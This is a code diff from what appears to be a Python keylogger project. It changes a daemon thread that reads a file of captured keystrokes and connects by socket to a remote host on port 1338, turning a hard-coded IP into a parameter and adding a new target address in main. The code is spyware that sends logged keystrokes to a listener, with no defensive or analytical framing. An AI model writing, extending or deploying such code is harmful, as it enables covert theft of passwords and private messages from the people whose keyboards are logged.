@@ -40,7 +40,8 @@ class Daemon(threading.Thread):
     def run(self):
         while True:
             time.sleep(self.timeSleep)
-            print "leeeeeeeee_____________"
+            #print "leeeeeeeee_____________"
+	    print '.'
 
             self.files.lock.acquire()
             self.files.fileR.seek(0)
@@ -69,7 +70,7 @@ class Daemon(threading.Thread):
     def make_cliente(self):
         socket_client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         try:
-            socket_client.connect(("192.168.0.6",1338))
+            socket_client.connect((self.ip,1338))
         except:
             pass#no online
 
@@ -109,7 +110,7 @@ if __name__ == '__main__':
     
     f = FileWR(fileKeys,fileKeysRead,lock)
 
-    daemon = Daemon(f)
+    daemon = Daemon(f,'192.168.43.105')
     daemon.start()
 
     ky = Keylogger(f)
